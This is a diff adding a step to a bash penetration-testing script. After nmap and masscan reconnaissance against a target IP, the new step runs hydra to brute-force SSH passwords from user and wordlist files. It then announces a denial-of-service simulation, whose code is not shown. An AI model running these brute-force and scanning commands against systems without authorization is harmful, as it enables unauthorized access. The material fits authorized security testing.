@@ -64,6 +64,28 @@ cat nmap.txt
 echo "Running masscan for Reconnaissance"
 sudo masscan -p 1-1000 $ip --banner --output-format json -oX masscan.json
 
+# hydra-gtk
+echo "Running hydra to try and bruteforce SSH password connection"
+echo "You have to place a file named users.txt and dict.txt to use for bruteforce"
+echo "Have you provided these files? [y/N]"
+read -r response
+
+if [[ "$response" =~ ^[Yy]$ ]]; then
+    echo "You have provided the files."
+    hydra -L users.txt -P dict.txt $ip ssh -t 4
+    exit_status=$?
+
+    if [ $exit_status -eq 0 ]; then
+        echo "Command executed successfully."
+    else
+        exit 1
+    fi
+else
+    echo "Cannot continue. Goodbye."
+    exit 0
+fi
+
+echo "This next attack is not mandatory. It is a simulation of denial of service."
 
 
 exit 0
